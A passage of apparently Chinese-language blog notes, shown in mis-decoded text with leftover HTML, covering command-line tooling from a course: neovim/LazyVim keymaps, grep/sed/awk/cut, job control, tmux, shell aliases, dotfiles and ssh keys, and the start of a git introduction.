æˆ‘ç†è§£ä¸º åœ¨ç³»ç»Ÿä¸­æ‰“å¼€vimè¿™ä¸ªè½¯ä»¶ä¸¤æ¬¡ï¼Œå°±æ˜¯ä¸¤ä¸ªtab</span><br><span class="line"></span><br><span class="line">window: vim å±å¹•ï¼Œå¯ä»¥åˆ†å±</span><br><span class="line"></span><br><span class="line">buffer: æ‰“å¼€æ–‡ä»¶ï¼Œæ–‡ä»¶å…·æœ‰buffer, åŒä¸€ä¸ªæ–‡ä»¶åŒä¸€ä¸ªbuffer,å®æ—¶ã€‚</span><br></pre></td></tr></table></figure><ul><li>é…ç½®ï¼Œvim åœ¨æ‰§è¡Œå‰ä¼šåŠ è½½ä¸€ä¸ª <code>~/.vimrc</code> æ–‡ä»¶ã€‚<ul><li>æˆ‘ä»¬å¯ä»¥DIYè‡ªå·±çš„å–œæ¬¢çš„æŒ‰é”®ã€‚</li><li>å®‰è£…æ’ä»¶å®ç°æ›´å¤šçš„åŠŸèƒ½</li></ul></li></ul><h3 id="neovim"><a href="#neovim" class="headerlink" title="neovim"></a>neovim</h3><ul><li>æœ¬äººä½¿ç”¨ <a href="https://neovim.io/">neovim</a> é…åˆ <a href="https://www.lazyvim.org/">LazyVim</a>ã€‚å¯DIY. ç„¶åå† <code>VsCode</code> å®‰è£…neovimæ’ä»¶ï¼ŒåŒæ­¥ä½¿ç”¨ã€‚</li><li>å¸¸ç”¨çš„æ“ä½œï¼Œneovimä¹Ÿèƒ½ç”¨ã€‚</li></ul><h4 id="keymap"><a href="#keymap" class="headerlink" title="keymap"></a>keymap</h4><ul><li><p>Leader ä¸º space é”®ï¼ŒæŒºå¥½ç”¨, ä½¿ç”¨è¿™äº›åŠŸèƒ½ä¹Ÿéœ€è¦å®‰è£…å¯¹åº”æ’ä»¶</p></li><li><p>æ‰“å¼€ç»ˆç«¯</p></li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>ft   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fT   /</span><br><span class="line"></span><br><span class="line">ctrl-/    æ‰“å¼€å’Œå…³é—­</span><br></pre></td></tr></table></figure><ul><li>å¿«é€Ÿæ³¨é‡Š</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>gc    ä½†æ˜¯éœ€è¦æŒ‡å®šçš„ LSP</span><br></pre></td></tr></table></figure><ul><li>ä¸åŒæ–‡ä»¶é—´(buffer)åˆ‡æ¢</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>bb</span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶æœç´¢ telescope</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-- æ–‡ä»¶å</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="symbol">&lt;leader&gt;</span>   <span class="symbol">&lt;esc&gt;</span><span class="symbol">&lt;esc&gt;</span> é€€å‡º</span><br><span class="line"></span><br><span class="line">-- æ–‡ä»¶å†…å®¹</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">sb</span></span><br></pre></td></tr></table></figure><ul><li>æ–‡ä»¶å†…</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;c-s&gt;</span> ä¿å­˜æ–‡ä»¶</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fn  <span class="keyword">new</span> <span class="keyword">file</span></span><br></pre></td></tr></table></figure><ul><li>åˆ†å±</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>|  <span class="symbol">&lt;leader&gt;</span>|  ç”ŸåŠ¨è¡¨ç¤ºç«–ç€</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">w</span>-  <span class="symbol">&lt;leader&gt;</span>-  æ¨ªç€</span><br><span class="line"></span><br><span class="line">-- åˆ‡æ¢ï¼Œå’Œ<span class="keyword">normal</span> <span class="keyword">mode</span> ä¸‹çš„ç§»åŠ¨è”ç³»</span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> å·¦</span><br><span class="line"><span class="symbol">&lt;C-j&gt;</span> ä¸‹</span><br><span class="line"><span class="symbol">&lt;C-k&gt;</span> ä¸Š</span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> å³</span><br></pre></td></tr></table></figure><ul><li>ä¾§è¾¹æ  neo-tree</li></ul><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;leader&gt;</span>fe   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>fE   /</span><br><span class="line"></span><br><span class="line"><span class="symbol">&lt;leader&gt;</span><span class="keyword">e</span>   å½“å‰</span><br><span class="line"><span class="symbol">&lt;leader&gt;</span>E   /</span><br><span class="line"></span><br><span class="line">-- ä¾§è¾¹æ è¿›å…¥æ–‡ä»¶åï¼Œåœ¨è¿›å…¥ä¾§è¾¹æ </span><br><span class="line"><span class="symbol">&lt;C-h&gt;</span> </span><br><span class="line"><span class="symbol">&lt;C-l&gt;</span> </span><br></pre></td></tr></table></figure><ul><li>lazy.nvim æ’ä»¶ç®¡ç†éå¸¸å—æ¬¢è¿ã€‚ä½œè€…å¼€å‘çš„æ’ä»¶å’Œé…ç½®ã€‚</li></ul><h2 id="lecture4-data-wrangling"><a href="#lecture4-data-wrangling" class="headerlink" title="lecture4: data wrangling"></a>lecture4: data wrangling</h2><blockquote><p>å¤„ç†æ•°æ®çš„æŸäº›æ‰‹æ®µ</p></blockquote><ul><li>grepï¼Œæœç´¢</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&quot;word&quot;</span> tmp.txt   <span class="comment"># æŸ¥è¯¢</span></span><br><span class="line">-R  <span class="comment"># é€’å½’ï¼Œå¯ä»¥æŸ¥æ‰¾æ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶</span></span><br></pre></td></tr></table></figure><ul><li>sedï¼Œåœ¨æœç´¢æ›¿æ¢æ˜¯ä¸€ä¸ªå¥½ç”¨çš„å·¥å…·ã€‚éœ€è¦å­¦ä¹ ä¸€ä¸‹æ­£åˆ™è¡¨è¾¾å¼</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sed <span class="string">&#x27;s/&lt;pattern&gt;/&lt;replace&gt;/&#x27;</span></span><br><span class="line">pattern: åŒ¹é…æ¨¡å¼ï¼Œæ”¯æŒæ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">replace: å°†åŒ¹é…åˆ°çš„pattern è½¬æ¢ä¸º replaceã€‚å½“æ•è·æ—¶ \num ä»£è¡¨ç¬¬numä¸ªæ•è·ï¼Œæ‰“å°</span><br><span class="line"></span><br><span class="line"><span class="comment"># sed é»˜è®¤æ”¯æŒå¾ˆè€çš„æ­£åˆ™è¡¨è¾¾å¼ï¼Œä½¿ç”¨ `-E` å‚æ•°ï¼Œæ”¯æŒç°ä»£åŒ–çš„æ­£åˆ™</span></span><br></pre></td></tr></table></figure><ul><li>ä¸€äº›æ­£åˆ™è¡¨è¾¾å¼ä½¿ç”¨ï¼Œä½¿ç”¨åœ¨çº¿ç½‘ç«™ç»ƒä¹ ã€‚regular expression</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[0-9]   0,1,2...9 å…¶ä¸­ä¸€ä¸ªæ•°å­—</span><br><span class="line">*       è´ªå©ªæ¨¡å¼ï¼Œ1æ¬¡æˆ–å¤šæ¬¡</span><br><span class="line">?       0 æˆ– 1 æ¬¡</span><br><span class="line">.       ä»»æ„å­—ç¬¦</span><br><span class="line">()      æ•è·æ‹¬å·å†…çš„å†…å®¹</span><br><span class="line">^ å¼€å¤´   $ æœ«å°¾</span><br></pre></td></tr></table></figure><ul><li>wc</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">wc</span> -l    word count,ç»Ÿè®¡å¤§å° -l line å‡ è¡Œ</span><br></pre></td></tr></table></figure><ul><li><p>æ’åºï¼Œå­—å…¸åºã€‚å»é‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sort</span>    é»˜è®¤å­—å…¸åºæ’åº</span><br><span class="line">-n æŒ‰ç…§æ•°å€¼çš„å¤§å°è¿›è¡Œæ’åº</span><br><span class="line">-k æŒ‡å®šæ’åºçš„åˆ—æ•°</span><br><span class="line"><span class="built_in">uniq</span>    å¯å»é™¤é‡å¤å†…å®¹</span><br><span class="line">-c  è®°å½•å‡ºç°æ¬¡æ•°</span><br></pre></td></tr></table></figure></li><li><p>awkï¼ŒåŸºäºæµçš„å¤„ç†ï¼Œæ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">awk <span class="string">&#x27;script&#x27;</span>  æ‰§è¡Œä¸€ä¸ªè„šæœ¬</span><br><span class="line">awk <span class="string">&#x27;&#123;print $0&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">-F  æŒ‡å®šåˆ†éš”ç¬¦</span><br></pre></td></tr></table></figure><ul><li>cutï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„split</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cut</span> [option] filename</span><br><span class="line">-d   å­—èŠ‚ä¸ºå•ä½åˆ†å‰²  </span><br><span class="line"><span class="built_in">cut</span> -d 3  ç¬¬ä¸‰ä¸ªå­—ç¬¦  -d 3-9,12  ç¬¬3-9,12ä¸ªå­—ç¬¦</span><br><span class="line">-f   fields ä¸-dä¸€èµ·ä½¿ç”¨ï¼Œè¡¨ç¤ºåŒºåŸŸ</span><br><span class="line"><span class="built_in">cut</span> -d : -f2  ç¬¬1-2ä¸ªå†’å·ä¹‹å‰çš„å†…å®¹</span><br><span class="line">-c   character å­—ç¬¦ä¸ºå•ä½ï¼Œå¤„ç†ä¸­æ–‡å¥½ç”¨</span><br><span class="line">-b   </span><br></pre></td></tr></table></figure><ul><li>ç¼–ç¨‹è¯­è¨€åœ¨å‘½ä»¤è¡Œçš„ä½¿ç”¨? å„ç§ç®¡é“ï¼Œå›¾ç‰‡éŸ³é¢‘å¤„ç†?</li></ul><h2 id="lecture5-command-line-environment"><a href="#lecture5-command-line-environment" class="headerlink" title="lecture5: command-line environment"></a>lecture5: command-line environment</h2><blockquote><p>ä¼˜é›…çš„ä½¿ç”¨å‘½ä»¤è¡Œ</p></blockquote><h3 id="job-control"><a href="#job-control" class="headerlink" title="job control"></a>job control</h3><ul><li>Linux ç³»ç»Ÿçš„ signalæœºåˆ¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">man signal : ä¼šçœ‹åˆ°ä¸åŒçš„number å’Œ name</span><br><span class="line"></span><br><span class="line">ctrl-c   SIGINT   signal interrupt</span><br><span class="line">ctrl-\   SIGQUIT</span><br></pre></td></tr></table></figure><ul><li>ctrl+z</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æš‚åœï¼Œå¯æ‰§è¡Œå…¶ä»–ä»»åŠ¡</span></span><br><span class="line">&amp;     åœ¨å‘½ä»¤ååŠ å…¥ï¼Œè¡¨ç¤ºåå°æ‰§è¡Œ</span><br><span class="line"><span class="built_in">jobs</span>  æŸ¥çœ‹åå°ä»»åŠ¡ï¼Œæš‚åœæˆ–è€…è¿è¡Œ pid</span><br><span class="line"><span class="built_in">fg</span> %num / <span class="built_in">bg</span> %num  ä½¿æš‚åœçš„ä»»åŠ¡ç»§ç»­è¿è¡Œï¼Œ<span class="built_in">fg</span> æ¢å¤åˆ°å‰å°ã€‚<span class="built_in">bg</span> æ¢å¤åˆ°åå°æ‰§è¡Œã€‚front back ground</span><br><span class="line"><span class="built_in">kill</span> %num            åœæ­¢</span><br></pre></td></tr></table></figure><h3 id="terminal-multiplexers"><a href="#terminal-multiplexers" class="headerlink" title="terminal multiplexers"></a>terminal multiplexers</h3><ul><li><p>ç»ˆç«¯å¤ç”¨ï¼Œåœ¨ä¸€ä¸ªterminal windowå¹²å¾ˆå¤šäº‹æƒ…ã€‚</p></li><li><p>å¾ˆå¤šçš„ç»ˆç«¯éƒ½å­˜åœ¨åˆ†å±ç­‰æ“ä½œï¼Œä½†æ˜¯è¯¾ç¨‹ä»‹ç»ç¥å™¨ <code>tmux</code>ï¼Œæ›´åŠ ç¥å¥‡ã€‚</p><ul><li>ä¸ kill sessionï¼Œå…¶ä¸­çš„å‘½ä»¤ä¼šä¸€ç›´æ‰§è¡Œä¸‹å»ã€‚åªéœ€è¦å¼€å¯ä¸€æ¬¡ç»ˆç«¯ã€‚</li><li>åœ¨ssh æœåŠ¡å™¨æ—¶éå¸¸çš„å¥½ç”¨</li></ul></li><li><p>session, window, pune</p><ul><li>å¯åŠ¨tmux, ä¼šå¼€å¯ä¸€ä¸ªsession, æ˜æ˜¾çš„æ˜¯ä¸‹é¢ä¼šå‡ºç°ä¸€è¡Œæ•°æ®ã€‚</li><li>window åˆ›å»ºä¸€ä¸ªæ–°çš„shell ç»ˆç«¯ã€‚</li><li>pune é¢æ¿ï¼Œä¸€ä¸ªçª—å£å¯ä»¥åˆ†å¾ˆå¤šçš„é¢æ¿ã€‚</li></ul></li><li><p>å‘½ä»¤è¡Œæ“ä½œ</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">tmux</span><br><span class="line">ä¸‹éƒ¨ä¼šå‡ºç°çŠ¶æ€æ ï¼Œåˆ†åˆ«æ˜¯session window1 windiow2...     æ—¶é—´ç­‰</span><br><span class="line"></span><br><span class="line">tmux a   <span class="comment"># attach è¿›å…¥session</span></span><br><span class="line">-t name  æŒ‡å®šåç§°</span><br><span class="line"></span><br><span class="line">tmux new -t &lt;name&gt;       åˆ›å»ºå¹¶æŒ‡å®šåç§°</span><br><span class="line">tmux kill-session -t &lt;num/name&gt;  æ€æ­»æŒ‡å®šçš„session</span><br><span class="line"></span><br><span class="line">tmux <span class="built_in">ls</span>   æŸ¥çœ‹æ‰€æœ‰çš„session</span><br><span class="line"></span><br><span class="line">tmux splitw -h/-v   pane æ¨ªç«–åˆ†å‰²window</span><br></pre></td></tr></table></figure><ul><li>é»˜è®¤å¿«æ·é”®ã€‚å¯ä»¥å…ˆæŒ‰ä¸€ä¸‹ <code>ctrl-b</code> åœ¨æŒ‰å…¶ä½™çš„ï¼Œä¸éœ€è¦åŒæ—¶æŒ‰ã€‚</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">prefix = Ctrl-b</span><br><span class="line"><span class="comment"># session prefix keymap</span></span><br><span class="line">prefix d   dettach session</span><br><span class="line">prefix s   åˆ—å‡ºæ‰€æœ‰session vimå¿«æ·é”®ä¸‹çš„é€‰æ‹©</span><br><span class="line"></span><br><span class="line"><span class="comment"># window</span></span><br><span class="line">prefix c   create a new window</span><br><span class="line">prefix p   previous window</span><br><span class="line">prefix n   next window</span><br><span class="line">prefix &lt;n&gt; ç¬¬nä¸ªçª—å£,næ˜¯ä¸ªæ•°å­—</span><br><span class="line">prefix w   åˆ—å‡ºwindow å’Œ session(s ?),  jk é€‰æ‹©ï¼Œenterè¿›å…¥</span><br><span class="line">prefix ,   é‡å‘½å</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># pune</span></span><br><span class="line">prefix x       å…³é—­pune</span><br><span class="line">prefix %       ç«–ç›´åˆ‡å‰²</span><br><span class="line">prefix <span class="string">&quot;       æ°´å¹³åˆ‡å‰²</span></span><br><span class="line"><span class="string">prefix æ–¹å‘é”®   é€‰æ‹© pune</span></span><br><span class="line"><span class="string">prefix x       å…³é—­pune</span></span><br><span class="line"><span class="string">prefix z       æœ€å¤§åŒ–å½“å‰çª—å£ï¼Œåœ¨æŒ‰ä¸€æ¬¡é€€å‡º</span></span><br><span class="line"><span class="string">prefix !       åˆ†ç¦»pune è¿›å…¥window</span></span><br><span class="line"><span class="string">æŒç»­æŒ‰prefix æ–¹å‘é”®  æ”¹å˜puneå¤§å°</span></span><br></pre></td></tr></table></figure><ul><li><p>é…ç½®å¿«æ·é”®ï¼Œ <code>~/.tmux.conf</code>ã€‚æˆ‘ä½¿ç”¨çš„æ˜¯åŸºäºç½‘ä¸Šæ‰¾çš„ <a href="https://www.debugpointer.com/linux/tmux-conf">tmux-conf</a>ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctrl-b è·ç¦»éå¸¸æœ‰ç‚¹é˜´é—´ï¼Œå› æ­¤éœ€è¦æ”¹ã€‚ctrl-a æ˜¯qemuå¿«æ·é”®ã€‚å› æ­¤é€‰æ‹©ctrl-x</span><br><span class="line"></span><br><span class="line">prefix I             install plugins</span><br><span class="line">prefix alt I         uninstall</span><br><span class="line"></span><br><span class="line">alt + æ–¹å‘é”®ï¼Œpune ç§»åŠ¨</span><br></pre></td></tr></table></figure></li><li><p>æ’ä»¶ç®¡ç† <a href="https://github.com/tmux-plugins/tpm">Tmux Plugin Manager</a></p></li><li><p>ç¾åŒ–+å¿«æ·é”® ç³»åˆ—æ“ä½œå‚è€ƒã€‚<a href="https://github.com/rothgar/awesome-tmux#themes">awesome-tmux: A list of awesome resources for tmux</a></p></li></ul><h3 id="aliases"><a href="#aliases" class="headerlink" title="aliases"></a>aliases</h3><ul><li>ç»™å¸¸ç”¨çš„å‘½ä»¤è®¾ç½®åˆ«å <ul><li>bash çš„<code>~/.bashrc</code> æ–‡ä»¶</li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># æ³¨æ„ï¼Œä¸è¦å­˜åœ¨ ll = &#x27;ls -l&#x27; å› ä¸ºåœ¨shell scriptä¸­ï¼Œç©ºæ ¼æ˜¯æœ‰æ„ä¹‰çš„</span></span><br><span class="line"><span class="built_in">alias</span> ll=<span class="string">&#x27;ls -alF&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> la=<span class="string">&#x27;ls -A&#x27;</span></span><br><span class="line"><span class="built_in">alias</span> l=<span class="string">&#x27;ls -CF&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="dotfiles"><a href="#dotfiles" class="headerlink" title="dotfiles"></a>dotfiles</h3><ul><li><p>å„ç§é…ç½®æ–‡ä»¶ã€‚å¤§éƒ¨åˆ†æ˜¯æ–‡ä»¶</p></li><li><p>bash -&gt; <code>~/.bashrc</code></p></li><li><p>zsh -&gt; <code>~/.zshrc</code>ã€‚æˆ‘ä»¬çš„zshç¾åŒ–ä¹Ÿæ˜¯ä¿®æ”¹æ­¤æ–‡ä»¶ã€‚</p></li><li><p>vim -&gt; <code>~/.vimrc</code></p></li><li><p>tmux -&gt; <code>~/tmux.conf</code></p></li><li><p>neovim -&gt; <code>~/.config/nvim</code> ç›®å½•ä¸‹çš„ <code>åŸºäºlua</code> é…ç½®</p></li><li><p>ssh -&gt; <code>~/.ssh</code> è¿™æ˜¯ä¸€ä¸ªç›®å½•ã€‚å¯ä»¥é…ç½®å…¬ç§é’¥ï¼Œå…å¯†ç™»å½•ã€‚</p><ul><li>è‡ªå·±çš„æœºå™¨ <code>ssh-keygen</code> å‘½ä»¤ç”Ÿæˆå…¬ç§é’¥</li><li>å°†å…¬é’¥æ”¾å…¥æœåŠ¡å™¨çš„ <code>authorized_keys</code>ã€‚æƒé™ä¸€èˆ¬æ˜¯<code>600</code></li></ul></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh-copy-id -i ~/.ssh/id_rsa.pubÂ  &lt;username&gt;@&lt;IP&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¸¸ç”¨çš„ssh ä¼ è¾“æ–‡ä»¶ scp  å’Œcpå‘½ä»¤å·®ä¸å¤šï¼Œç»™å‡ºè·¯å¾„</span></span><br><span class="line">scp tmp.txt &lt;user&gt;@&lt;IP&gt;:/tmp</span><br></pre></td></tr></table></figure><ul><li><p>æ„Ÿå…´è¶£çš„å¯ä»¥å­¦ä¹ ä¸€ä¸‹ <a href="https://nixos.org/">NixOS</a>, ä¸€ä¸ªåŸºäºé…ç½®æ–‡ä»¶çš„æ“ä½œç³»ç»ŸğŸ˜‹</p></li><li><p>å¤§éƒ¨åˆ†é…ç½®éƒ½å¯åœ¨ github æŸ¥æ‰¾åˆ°ï¼Œå¦‚æœä¸æƒ³è‡ªå·±é…ç½®ï¼Œç›´æ¥ <code>clone/fork</code> ä¸€ä¸ªå…¶ä»–äººçš„ã€‚</p></li><li><p>bash å‰é¢çš„ä¸€ä¸²çš„ä¿®æ”¹</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS1=<span class="string">&quot;user&gt;&quot;</span>   æˆ‘ä»¬shell å‰é¢çš„ä¸€ä¸²</span><br></pre></td></tr></table></figure><blockquote><p>é—®é¢˜ï¼šå¦‚ä½•åœ¨æœ¬æœºå’ŒæœåŠ¡å™¨åŒæ—¶ä½¿ç”¨tmux</p></blockquote><p>ç›¸åŒçš„é…ç½®ä¼šå¯èƒ½äº§ç”Ÿå†²çªï¼Œæˆ–è€…ä¼šä½¿æˆ‘ä»¬ä¸çŸ¥é“æ“ä½œçš„æ˜¯å“ªä¸€ä¸ªï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦ä¸åŒçš„é…ç½®æ–‡ä»¶ã€‚æœ€ç®€å•çš„å°±æ˜¯ä½¿ç”¨ä¸¤ä¸ª <code>prefix</code> ã€‚</p><h2 id="lecture6-virsion-control-git"><a href="#lecture6-virsion-control-git" class="headerlink" title="lecture6: virsion control(git)"></a>lecture6: virsion control(git)</h2><blockquote><p>gitç‰ˆæœ¬æ§åˆ¶</p></blockquote><ul><li><p>å¼€å‘é¡¹ç›®ï¼Œå›¢é˜Ÿåˆä½œï¼Œæ–‡ä»¶æŸåçš„å›é€€ã€‚ã€‚ã€‚gitéƒ½å¯ä»¥åœ¨å¾ˆå¤§ç¨‹åº¦ä¸Šå¸®åŠ©æˆ‘ä»¬ï¼Œä¸éœ€è¦åˆ é™¤åœ¨é‡æ–°ä¸‹è½½ğŸ˜˜</p></li><li><p>git æŠ½è±¡å»ºæ¨¡ã€‚ä½¿ç”¨æœ‰å‘æ— ç¯å›¾è¿›è¡ŒæŠ½è±¡</p><ul><li>é¡¶å±‚rootï¼Œæ–‡ä»¶å¤¹æŠ½è±¡ä¸º<code>tree</code>, æ–‡ä»¶æŠ½è±¡ä¸º<code>blob</code></li><li>commit: æ¯æ¬¡commit äº§ç”Ÿä¸€ä¸ªç±»ä¼¼ <code>snapshot(å¿«ç…§)</code>çš„ä¸œè¥¿ï¼Œä¿å­˜å½“å‰çš„çŠ¶æ€ä»¥åŠä¸€äº›ä¿¡æ¯(ä½œè€…ï¼Œæè¿°â€¦)ã€‚</li><li>é€šè¿‡ <code>mapping&lt;string, object&gt;</code> è¿›è¡Œç®¡ç†.stringæŒ‡æ–‡ä»¶çš„å“ˆå¸Œå€¼(SHA-1)ï¼Œobjectæ˜¯æˆ‘ä»¬æ–‡ä»¶ä¿å­˜çš„åœ°å€(â€˜snapshotâ€™åœ¨ç£ç›˜ä¸­çš„åœ°å€)ã€‚æ¯æ¬¡ä¿®æ”¹ï¼Œcommitä¼šäº§ç”Ÿæ–°çš„hash</li></ul></li><li><p>reference: gitéœ€è¦çš„æ˜¯æ–‡ä»¶çš„å“ˆå¸Œå€¼ï¼Œå¯¹äºäººç±»æ¯«æ— æ„ä¹‰ï¼Œå› æ­¤å­˜åœ¨å¦ä¸€ä¸ª <code>mapping&lt;string, string&gt;</code> ã€‚æˆ‘ä»¬ä½¿ç”¨å¯ä»¥äººç±»æ–¹ä¾¿é˜…è¯»çš„å­—ç¬¦ä¸²ï¼Œæ˜ å°„åˆ°hashï¼Œç„¶ååœ¨å¯»æ‰¾åˆ°æ–‡ä»¶</p></li><li><p>git å‡ ä¸ªçŠ¶æ€ï¼Œå¯ä»¥çœ‹çœ‹ <a href="https://www.bilibili.com/video/BV1r3411F7kn/?spm_id_from=333.337.search-card.all.click&vd_source=ccaa27461534d3a4a5e9b964672f86d6">Gitå·¥ä½œæµå’Œæ ¸å¿ƒåŸç†</a>ï¼Œéå¸¸æœ‰è¶£ã€‚åœ¨å­¦ä¹ æ—¶ï¼Œå¯ä»¥æƒ³è±¡ä¸€ä¸‹æœ‰å‘æ— ç¯å›¾è¿›è¡Œç†è§£ã€‚</p><ul><li>å·¥ä½œåŒº</li><li>æš‚å­˜åŒº</li><li>æœ¬åœ°ä»“åº“</li><li>è¿œç¨‹ä»“åº“</li></ul></li><li><p>git çš„é…ç½®</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># é…ç½®ç”¨æˆ·åï¼Œé‚®ç®±ã€‚è‡ªå·±çš„è´¦æˆ·ã€‚</span></span><br><span class="line">git config --global user.name <span class="string">&quot;your name&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;your email&quot;</span></span><br></pre></td></tr></table></figure><ul><li>åˆ›å»ºä¸€ä¸ªgitä»“åº“</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> demo</span><br><span class="line"><span class="built_in">cd</span> demo</span><br><span class="line"></span><br><span class="line">git init   <span class="comment"># æœ¬åœ°ä»“åº“åˆå§‹åŒ–ï¼Œå‡ºç°ä¸€ä¸ª `.git` çš„ç›®å½•</span></span><br><span class="line"></span><br><span class="line">git status <span class="comment"># æŸ¥çœ‹ä»“åº“çŠ¶æ€ï¼Œéå¸¸å¸¸ç”¨</span></span><br></pre></td></tr></table></figure><ul><li>æ—¥å¿—ï¼ŒæŸ¥çœ‹æäº¤çš„æ–‡ä»¶</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># oneline å»é™¤ä¸€å®šçš„ä¿¡æ¯</span></span><br><span class="line">git <span class="built_in">log</span> --all --graph --decorate 